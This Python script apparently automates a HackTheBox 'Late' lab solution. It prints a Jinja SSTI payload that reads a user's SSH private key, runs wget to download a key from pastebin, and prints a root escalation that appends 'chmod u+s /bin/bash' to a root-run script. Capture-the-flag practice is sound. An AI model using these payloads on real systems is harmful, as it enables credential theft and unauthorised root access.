import sys, os, requests, re, subprocess, paramiko,threading
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder
from ftplib import FTP

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Late
    __________________________________________________________________________\n"""
    print(Fore.LIGHTMAGENTA_EX + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] svc_acc","[+] Root", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.156" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit ] > " + Fore.YELLOW + f"SMB {target_machine}");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Late Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

#------------------------------------------------------------------------

def svc_acc_connection():
    print(tmsg,Fore.RED + f"[Exploit Image Path (SSTI)] > " + Fore.LIGHTMAGENTA_EX + f"http://images.late.htb/");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit Image Code Screen (SSTI)] > " + Fore.LIGHTMAGENTA_EX + "{{{ get_flashed_messages.__globals__.__builtins__.open(\"/home/svc_acc/.ssh/id_rsa\").read() }}}");cm.sleep(.5)
    commands_send("wget https://pastebin.com/raw/gsCE1ELT && cat gsCE1ELT > id_rsa && chmod 600 id_rsa")
    #commands_send(f"ssh -i id_rsa svc_acc@{target_machine}")
    print(tmsg,Fore.RED + f"[Exploit Run Command (SSTI)] > " + Fore.LIGHTCYAN_EX + f"ssh -i id_rsa svc_acc@{target_machine}");cm.sleep(.5)

def root_connection():
    print(tmsg,Fore.RED + f"[Exploit Bash Code (SSTI)] > " + Fore.LIGHTCYAN_EX + f"/usr/local/sbin/ssh-alert.sh");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit Image Path (Shell Windows)] > " + Fore.LIGHTMAGENTA_EX + f"cd /tmp");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit Image Path (Shell Windows)] > " + Fore.LIGHTMAGENTA_EX + f"echo \"chmod u+s /bin/bash\" > test.txt && cat test.txt >> /usr/local/sbin/ssh-alert.sh && cat /usr/local/sbin/ssh-alert.sh");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit Run command (Shell)] > " + Fore.LIGHTMAGENTA_EX + f"ssh -i id_rsa svc_acc@{target_machine}");cm.sleep(.5)

#------------------------------------------------------------------------
def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","svc_acc-user connection"))
                svc_acc_connection()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[svc_acc-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Root user connection"))
                root_connection()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Root-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
